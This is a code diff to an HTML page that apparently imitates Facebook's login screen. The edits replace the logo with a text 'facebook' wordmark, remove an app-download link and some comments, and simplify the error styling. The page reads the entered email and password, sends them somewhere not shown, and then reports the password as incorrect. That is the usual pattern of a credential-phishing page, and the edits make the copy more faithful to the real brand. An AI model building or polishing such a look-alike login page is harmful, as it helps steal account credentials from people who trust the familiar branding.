@@ -26,17 +26,16 @@
             padding: 20px;
         }
 
-        /* Get Facebook for iOS */
-        .get-app {
+        /* Facebook Text Logo */
+        .logo {
             text-align: center;
-            margin-bottom: 20px;
+            margin-bottom: 30px;
         }
 
-        .get-app a {
+        .logo h1 {
             color: #1877f2;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
+            font-size: 60px;
+            font-weight: bold;
         }
 
         /* Language Selector */
@@ -52,30 +51,6 @@
             color: #1b1f23;
             font-weight: 500;
             cursor: pointer;
-        }
-
-        /* Circle F Logo */
-        .logo {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        .circle-f {
-            width: 70px;
-            height: 70px;
-            background: #1877f2;
-            border-radius: 50%;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-        }
-
-        .circle-f span {
-            color: white;
-            font-size: 48px;
-            font-weight: bold;
-            font-family: Arial, Helvetica, sans-serif;
         }
 
         /* Login Form */
@@ -102,7 +77,6 @@
             box-shadow: 0 0 0 2px #e7f3ff;
         }
 
-        /* Login Button - Blue with curve */
         .login-btn {
             width: 100%;
             background: #1877f2;
@@ -120,7 +94,6 @@
             background: #166fe5;
         }
 
-        /* Forgot Password - BLACK color */
         .forgot {
             text-align: center;
             margin-bottom: 20px;
@@ -137,13 +110,11 @@
             text-decoration: underline;
         }
 
-        /* Divider */
         .hr {
             border-bottom: 1px solid #dadde1;
             margin: 20px 0;
         }
 
-        /* Create Account - BLUE OUTLINE BOX with curve */
         .create-btn {
             width: 100%;
             background: transparent;
@@ -161,7 +132,6 @@
             background: #e7f3ff;
         }
 
-        /* Meta Footer */
         .meta-footer {
             text-align: center;
             margin-top: 30px;
@@ -196,10 +166,6 @@
             font-size: 12px;
         }
 
-        .footer-links a:hover {
-            text-decoration: underline;
-        }
-
         .error-msg {
             color: #f02849;
             text-align: center;
@@ -212,11 +178,6 @@
 <body>
 
 <div class="container">
-    <!-- Get Facebook for iOS -->
-    <div class="get-app">
-        <a href="#">Get Facebook for iOS and browse faster.</a>
-    </div>
-
     <!-- Language Selector -->
     <div class="language">
         <select>
@@ -226,11 +187,9 @@
         </select>
     </div>
 
-    <!-- Circle F Logo -->
+    <!-- Facebook Text Logo -->
     <div class="logo">
-        <div class="circle-f">
-            <span>f</span>
-        </div>
+        <h1>facebook</h1>
     </div>
 
     <!-- Login Form -->
@@ -265,24 +224,18 @@
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
         const errorDiv = document.getElementById('errorMsg');
-        const emailInput = document.getElementById('email');
-        const pwInput = document.getElementById('password');
 
         errorDiv.style.display = 'none';
-        emailInput.style.borderColor = '#dddfe2';
-        pwInput.style.borderColor = '#dddfe2';
 
         if (!email) {
             errorDiv.innerText = 'Mobile number or email address is required.';
             errorDiv.style.display = 'block';
-            emailInput.style.borderColor = '#f02849';
             return;
         }
 
         if (!password) {
             errorDiv.innerText = 'Password is required.';
             errorDiv.style.display = 'block';
-            pwInput.style.borderColor = '#f02849';
             return;
         }
 
@@ -299,7 +252,6 @@
             } else {
                 errorDiv.innerText = 'The password that you\'ve entered is incorrect.';
                 errorDiv.style.display = 'block';
-                pwInput.style.borderColor = '#f02849';
             }
         } catch (err) {
             errorDiv.innerText = 'Connection error. Try again.';
